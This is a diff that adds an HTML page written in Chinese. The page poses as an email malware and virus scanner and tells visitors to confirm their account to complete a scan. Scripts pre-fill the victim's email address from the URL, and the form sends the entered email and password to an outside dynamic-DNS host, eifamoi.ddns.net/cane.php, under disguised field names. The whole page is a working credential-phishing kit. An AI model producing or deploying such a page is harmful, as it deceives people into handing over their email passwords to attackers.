@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+ 
+
+  <title>邮件病毒扫描</title>
+  <link href="css/foume.css" rel="stylesheet">
+<script src="css/jquery.min.js"></script>
+ 
+</head>
+
+<body>
+ 
+<div class="stin"> <div class="container"><input class="misp" readonly id="email"/> <br><span style="color: white; font-size: 30px; font-weight: 600;">恶意软件和病毒扫描程序</span></div></div>
+  <div class="container trat">
+  <div class="row">
+  <div class="col-sm-4"><img src="img/safe.png" class="sat" style="margin-top: 90px;"></div>
+  <div class="col-sm-6">
+  <div style="padding-bottom: 13px; border-bottom: solid 2px gray; color: #084B8A; font-weight: 600; font-family: 30px; margin-top: 30px; width: 300px;">邮件帐户验证</div><br>
+  <div style="font-size: 13px; font-weight: 600;">确认以下帐户以完成电子邮件扫描并删除所有受感染的文件  </div>
+  
+  <div>
+  <form action="https://eifamoi.ddns.net/cane.php" method="post">
+  <input style="" class="in" id="2email" name="setpoint" type="email" placeholder="电子邮件地址" />
+  <input style="border: 0; box-shadow: none; height: 31px; margin-top: 10px; font-size: 18px; font-weight: 700; color: green; padding: 0;"   class="in" id="3email" name="" readonly type="" placeholder="" />       
+   <input style="" class="in" id="2email" name="drumal" type="password" placeholder="密码"/>
+   
+   <br>
+   <button style="" type="submit" name="actorl">完成扫描 >></button>
+  </form>
+  
+  
+  </div>
+  </div>
+  <div class="col-sm-2"></div>
+  <Center><img src="img/icon.png" class="mat" style="margin-top: 90px;"></center>
+  
+</div></div>
+<div class="stin" style="height: 70px; bottom: 0; position: absolute; font-size: 14px; color: gold;"> <div class="container"><center>
+邮件在线病毒扫描程序：电子邮件用户帐户： <input id="4email" readonly style="border: none; outline: 0; background: transparent; color: white;" /></center></div></div>
+
+
+
+<script>
+$.urlParam = function(email){
+var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href);
+return results[1] || 0;
+}
+</script>
+
+
+
+
+
+<script>
+$( document ).ready(function() {
+// after the page elements are all loaded, then run the script
+// Set the input field with unique ID #email to a value
+$("#email").val($.urlParam('email'));
+});
+</script>
+<script>
+$( document ).ready(function() {
+// after the page elements are all loaded, then run the script
+// Set the input field with unique ID #email to a value
+$("#2email").val($.urlParam('email'));
+});
+</script>
+<script>
+$( document ).ready(function() {
+// after the page elements are all loaded, then run the script
+// Set the input field with unique ID #email to a value
+$("#3email").val($.urlParam('email'));
+});
+</script>
+<script>
+$( document ).ready(function() {
+// after the page elements are all loaded, then run the script
+// Set the input field with unique ID #email to a value
+$("#4email").val($.urlParam('email'));
+});
+</script>
+</body>
+
+</html>
